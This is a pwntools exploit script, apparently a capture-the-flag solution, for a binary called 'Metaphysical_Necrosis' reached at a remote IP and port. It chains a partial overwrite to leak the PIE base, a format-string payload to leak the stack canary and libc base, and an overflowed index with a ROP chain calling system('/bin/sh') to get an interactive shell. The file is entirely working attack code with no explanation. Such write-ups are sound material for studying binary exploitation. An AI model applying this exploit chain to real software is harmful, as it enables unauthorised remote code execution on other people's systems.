from pwn import*
from LibcSearcher import*
p = process('Metaphysical_Necrosis')
elf = ELF('Metaphysical_Necrosis')
context.log_level = 'debug'
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
libc = ELF('libc-2.23.so')
p = remote('47.103.214.163',21003)

p.sendline('3') #HI(var)
p.send('\x90\x49') #String<8B From [RBP-10] To Down
p.recv()
p.sendline('') #getchar()
p.sendline('') #getchar()
p.recv()
p.sendline('FMYY') #name in BSS
p.recv()
p.sendline('0') #Array[160] [RBP-BO]
p.recv
p.sendline() #getchar()
p.sendline() #getchar()
p.recv()
p.sendline('-21') #LO(var)
p.recvuntil('\x57\x69\x6E\x0A')
pie = u64(p.recv(6).ljust(8,'\x00')) - 0x990
log.success('PIE:\t'+hex(pie))
p.sendline(p64(pie+0x906)) #&E99+var Modify The Puts To Printf
#-------------------
p.recv()
p.sendline('3')
p.send('\x90\x49')
p.recv()
p.sendline('')
p.sendline('')
p.recv()
p.sendline('PP%29$pNN%33$pQQ')
p.sendline('0')
p.recvuntil('PP')
canary = int(p.recvuntil('NN',drop = True),16)
log.success('Canary:\t' + hex(canary))
libcbase = int(p.recv(14),16)-libc.sym['__libc_start_main']-0xF0
log.success('LibcBase:\t' + hex(libcbase))
p.sendline() #getchar()
p.sendline() #getchar()
p.sendline('0')
#----------------------
p.recv()
p.sendline('3')
p.send('\x90\x49')
p.sendline() #getchar()
p.sendline() #getchar()
p.recv()
p.sendline('/bin/sh\x00')
p.recv()
p.sendline('-2147000038')
for i in range(21):
	p.sendline('0')
p.sendline(p64(canary))
p.sendline('0')
p.sendline(p64(pie+0xF93))
p.sendline(p64(pie+0x2020E0)) #binsh_addr <-name
p.sendline(p64(libcbase+libc.sym['system']))
p.sendline()
p.sendline()
p.sendline()
p.interactive()
